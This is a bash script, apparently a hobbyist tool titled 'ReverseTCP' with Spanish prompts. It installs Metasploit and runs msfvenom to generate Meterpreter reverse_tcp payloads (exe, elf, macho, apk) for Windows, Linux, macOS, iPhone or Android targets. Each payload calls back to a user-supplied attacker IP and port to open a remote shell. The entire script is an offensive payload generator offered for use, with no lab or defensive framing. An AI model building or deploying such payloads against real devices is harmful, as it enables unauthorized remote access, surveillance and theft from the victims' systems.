#!/bin/bash

clear
sleep 1

# Instalar dependencias si faltan
sudo pacman -S --noconfirm python figlet metasploit-framework

clear
sleep 1

# Banner estético
printf '\033[38;2;220;45;45m'
figlet "ReverseTCP"
printf '\033[0m'

python -c 's="By Elpíxel"; [print(f"\033[38;2;{int(220+35*i/(len(s)-1))};{int(45+105*i/(len(s)-1))};40m{c}",end="") for i,c in enumerate(s)]; print("\033[0m")'
echo "=================================================================================="
echo "          -------------------------------------------------------------           "

# Captura de datos
echo "Introduce una dirección IP: "
read IP

echo "Introduce el puerto de escucha: "
read port

echo "¿Qué sistema operativo tiene el dispositivo objetivo? (Windows | GNU/Linux | MacOS | Iphone | Android): "
read hack

# Validación del sistema operativo (Mensaje corregido)
while [[ ! "$hack" =~ ^(Windows|windows|Linux|linux|MacOS|macos|Mac|Iphone|iphone|Android|android)$ ]]; do
    echo "Payload no encontrado para dicho sistema operativo, intente de nuevo."
    echo "¿Qué sistema operativo tiene el dispositivo objetivo? (Windows | GNU/Linux | MacOS | Iphone | Android): "
    read hack
done

clear
sleep 1

# Selección de payload según el sistema operativo
if [[ "$hack" =~ ^(Windows|windows)$ ]]; then
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f exe -o payload_windows.exe

elif [[ "$hack" =~ ^(Linux|linux)$ ]]; then
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f elf -o payload_linux.elf
    
elif [[ "$hack" =~ ^(Mac|MacOS|mac|macos)$ ]]; then
    msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$port -f macho -o payload_mac.macho

elif [[ "$hack" =~ ^(Iphone|iphone)$ ]]; then
    msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$IP LPORT=$port -f macho -o payload_iphone.macho
    
elif [[ "$hack" =~ ^(Android|android)$ ]]; then
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -o payload_android.apk
fi

# Interfaz común de finalización (Optimización para evitar repetir código)
echo ""
echo ""
printf '\033[1;33m'
echo "Payload creado correctamente"
printf '\033[0m'    

echo ""
echo "Pulsa Ctrl + C para salir de la herramienta..."
echo ""

# Manejo de la señal Ctrl+C
ctrl_c=false
trap 'ctrl_c=true' SIGINT

while [ "$ctrl_c" = false ]; do
    sleep 1
done

if [ "$ctrl_c" = true ]; then
    printf '\033[1;31m'
    echo "[*] Saliendo de la herramienta..."
    printf '\033[0m'

    sleep 2
    clear
fi
